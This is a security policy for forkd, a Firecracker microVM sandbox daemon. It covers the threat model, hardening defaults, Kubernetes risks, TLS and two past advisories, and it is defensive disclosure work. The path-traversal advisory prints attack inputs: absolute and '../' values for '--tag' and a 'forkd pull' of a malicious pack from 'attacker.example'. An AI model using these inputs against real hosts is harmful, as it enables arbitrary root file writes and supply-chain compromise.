# Security policy

forkd is alpha software. The threat model and current guarantees are
documented below so operators can decide what workload they are
willing to point at it.

## Threat model

forkd assumes:

1. **Host kernel and Firecracker are part of the TCB.** A compromised
   host can do anything to its sandboxes. forkd does not attempt to
   protect against a hostile administrator.

2. **Sandboxes are mutually untrusted.** Each child runs in its own
   KVM-backed microVM with a separate netns and cgroup. Escaping
   requires a KVM or Firecracker vulnerability (the same boundary
   AWS Lambda relies on).

3. **The daemon's REST surface is partially trusted.** When
   `--token-file` is set, possessing the token grants full control
   over snapshots and sandboxes on that host. Treat the token like a
   root credential.

## Default posture

| Concern | Default | How to harden |
|---|---|---|
| Daemon bind | `127.0.0.1:8889` (loopback only) | Override at your own risk; pair with `--tls-cert` + `--token-file` |
| TLS | off (loopback HTTP) | `--tls-cert /etc/forkd/tls/cert.pem --tls-key ...` (rustls 0.23, modern cipher suites only) |
| Authentication | none | `--token-file /etc/forkd/token` |
| Per-child memory cap | none | `memory_limit_mib` per sandbox |
| Per-child netns | shared (same host bridge) | `per_child_netns: true` + `scripts/netns-setup.sh N` |
| Firecracker seccomp | enabled by Firecracker default | n/a — already on |
| Guest agent reachability | inside netns | each child's agent is reachable only from its own netns |
| Audit log | `/var/log/forkd/audit.log`, JSON lines | tail with vector / fluentbit; rotate with logrotate |

## Kubernetes deployment

The shipped `packaging/k8s/forkd-controller.yaml` runs the daemon
with `privileged: true`, `runAsUser: 0`, and a writable
`/sys/fs/cgroup` hostPath mount. This is **necessary** — Firecracker
needs `/dev/kvm`, cgroup v2 writes for memory caps, and tap-device
creation. It is also **node-level blast-radius**: a compromised
forkd-controller pod can escape to the node it runs on.

Operational consequences:

- Treat the forkd-controller pod's bearer token like SSH-root on the
  node. Rotate on any access change.
- Pin the pod to a dedicated node pool. Do not co-schedule untrusted
  tenants.
- The daemon refuses to start if the manifest's placeholder bearer
  token (`REPLACE_ME_*` / `CHANGE_ME_*`) is left in place — a forgotten
  `sed` step becomes a noisy fail rather than a silent compromise.
- For multi-tenant deployments, run one forkd-controller per tenant
  on dedicated nodes rather than sharing a daemon.

## Concurrency caps

`POST /v1/sandboxes/:id/branch` admits at most
`DEFAULT_BRANCH_CONCURRENCY` (currently 4) simultaneous operations.
Excess requests get `503 Service Unavailable`. The cap bounds peak
transient disk usage (each BRANCH writes a full `memory.bin`, typically
256 MiB – 8 GiB). Two BRANCHes targeting the same `tag` are serialised
via an in-flight set; the second gets `409 Conflict`.

`boot_wait_secs` on `POST /v1/snapshots` is capped at 60 seconds.
Uncapped values would let a hostile caller tie up a daemon worker.

## TLS

Pass `--tls-cert <cert.pem> --tls-key <key.pem>` to `forkd-controller
serve` (or set `FORKD_TLS_CERT` / `FORKD_TLS_KEY`). The daemon uses
rustls 0.23 with the aws-lc-rs crypto provider; TLS 1.2 and TLS 1.3
are accepted, legacy cipher suites are not negotiable. Both PEM
files must be readable by the daemon's user and SHOULD have mode 0600.

Operationally:

- Use a real CA (Let's Encrypt or your internal PKI). Self-signed
  certs work but require clients to bypass cert validation.
- Rotate by writing new files and `systemctl restart forkd-controller`.
- Bearer-token auth is **not** automatically enabled by TLS — supply
  `--token-file` as well for any non-loopback deployment.

## What forkd does not do (yet)

- **Multi-node scheduling.** One daemon = one host. No HA, no failover.
- **Default-deny egress.** Children share the host's MASQUERADE rule;
  outbound to the internet works by default. For an allow-list policy,
  add per-netns iptables rules after `scripts/netns-setup.sh`.
- **Quotas beyond memory.** cpu.max, io.max, pids.max are not yet
  wired into ForkOpts.
- **Third-party security audit.** Not started. Will be required
  before forkd claims a "production" status badge.

## Reporting a vulnerability

Email `security@deeplethe.com`. Please do not open a public issue for
security reports. We aim to acknowledge within 72 hours and ship a fix
or mitigation within 14 days for confirmed issues.

## Supported versions

Pre-1.0 releases receive fixes only on the latest minor. The CHANGELOG
records which API versions are affected by each advisory.

## Past advisories

### 2026-05-17 — Daemon `snapshot_tag` validation gap (fixed in 0.1.4)

**Affected**: forkd-controller 0.1.0 through 0.1.3 inclusive.
**Fixed in**: 0.1.4 (PR #54).
**Severity**: Medium-High, post-authentication.
**Discovered**: internal security review during v0.2 retrospective.

**Description**

`POST /v1/sandboxes` accepted `req.snapshot_tag` from the request body
and joined it directly into `snapshot_root` without calling
`is_safe_tag`. Sister handlers (`POST /v1/snapshots`,
`DELETE /v1/snapshots/:tag`, `POST /v1/sandboxes/:id/branch`) all
validated; `create_sandbox` was an asymmetric oversight.

The unvalidated tag also persisted into `SandboxInfo.snapshot_tag`
and was later consumed by `read_snapshot_volumes` during BRANCH,
which `serde_json::from_str`'d the file at `<snapshot_root>/<tag>/
snapshot.json` as a `forkd_vmm::Snapshot`. An attacker who could
write a valid `Snapshot`-shaped JSON file anywhere on disk and reach
the daemon's REST surface could control the volume specs of
grandchild VMs — i.e., mount arbitrary host block devices into a
sandbox.

**Impact gating**

- Requires the bearer token (or a daemon started without `--token-file`
  on a non-loopback bind, which already warned at startup).
- The K8s manifest's placeholder bearer token (separate finding in
  the same PR) made the auth gate brittle if `kubectl apply` ran
  without first replacing the Secret.

**Fix in 0.1.4**

- `is_safe_tag(&req.snapshot_tag)` in `create_sandbox`, returning 400.
- Defense-in-depth `is_safe_tag` inside `read_snapshot_volumes` —
  refuses to dereference an unsafe tag even if a future caller forgets.
- `validate_token()` rejects `REPLACE_ME_*` / `CHANGE_ME_*` prefixes
  and tokens under 16 bytes at daemon startup.
- `boot_wait_secs` on `POST /v1/snapshots` capped at 60 seconds.

**Verification**

PR #54 ships as two commits: a failing-test commit (
[424e4a7](https://github.com/deeplethe/forkd/commit/424e4a7),
[CI red](https://github.com/deeplethe/forkd/actions/runs/25987955183))
and a fix commit (
[6efc1e9](https://github.com/deeplethe/forkd/commit/6efc1e9),
[CI green](https://github.com/deeplethe/forkd/actions/runs/25988085193)).
The red CI log is the bug-existence proof; the green log is the
fix-validity proof.

**Credits**: discovered and fixed internally during the v0.2 retro.
No external reports.

### 2026-05-13 — Path traversal via `--tag` (CVE-class, fixed in 0.1.3)

**Affected**: forkd CLI 0.1.0 through 0.1.2 inclusive.
**Fixed in**: 0.1.3.
**Severity**: High (local file write as the running user; high impact
under the typical `sudo forkd` execution model).
**Discovered**: internal bug-bash, May 2026.

**Description**

`forkd` CLI commands that accept a `--tag` flag computed their
destination directory as `data_dir().join("snapshots").join(tag)`.
Rust's `Path::join` silently discards the base when the right side is
absolute, and the implementation did not reject `..` segments. Several
attack shapes worked:

```bash
# Writes Firecracker snapshot files to /etc/forkd-bad/
sudo forkd snapshot --tag /etc/forkd-bad ...

# Climbs out of the data dir
sudo forkd snapshot --tag ../../../etc/forkd-bad ...

# Or via a malicious pack: manifest.toml declares tag = "../../etc/x"
sudo forkd pull https://attacker.example/evil.tar.zst
```

The same code path is hit by `forkd unpack`, `forkd push`, `forkd pull`,
`forkd fork`, and `forkd pack` (read-only for the last two but with
confusing error messages).

**Impact**

- Anyone who can influence the `--tag` argument can write arbitrary
  files at any path the forkd process is allowed to write to.
- Files written include `memory.bin` (typically hundreds of MiB to
  several GiB), `vmstate`, `rootfs.ext4`, and `snapshot.json`.
- Most serious under `sudo forkd` (the typical KVM-required deployment
  model), where the writes happen as root.
- For Snapshot Hub users: a malicious or compromised pack on the hub
  could declare `tag = "../../etc/something"` in its `manifest.toml`
  and write its files anywhere the running user can write, on every
  host that pulls it. This is the canonical supply-chain shape.

**Mitigations available before upgrading**

- Do not run `forkd` with `sudo` for tag inputs that aren't a fixed
  literal you control.
- Do not `forkd pull` snapshot packs from untrusted publishers until
  you have 0.1.3 or later installed.
- The exploit requires the attacker to influence either `--tag` or
  the `tag` field inside a pack's `manifest.toml`. If your operator
  workflow always passes a hardcoded tag and never pulls a third-party
  pack, you are not exposed.

**Fix in 0.1.3**

Added a `validate_tag()` check applied at every CLI surface that
accepts a tag (`snapshot`, `fork`, `pack`, `push`, `unpack`, `pull`),
and again on the `tag` field read from `manifest.toml` inside a pack
before any path is derived from it. The allowed shape is:

```
[A-Za-z0-9_][A-Za-z0-9._-]{0,63}
```

1–64 characters, starting with an alphanumeric or underscore. This
rejects empty tags, absolute paths, `..` segments, leading dots/dashes,
slashes, shell metacharacters, and anything else that could affect
path computation.

**Credits**: discovered and fixed internally during a bug-bash session.
No external reports.
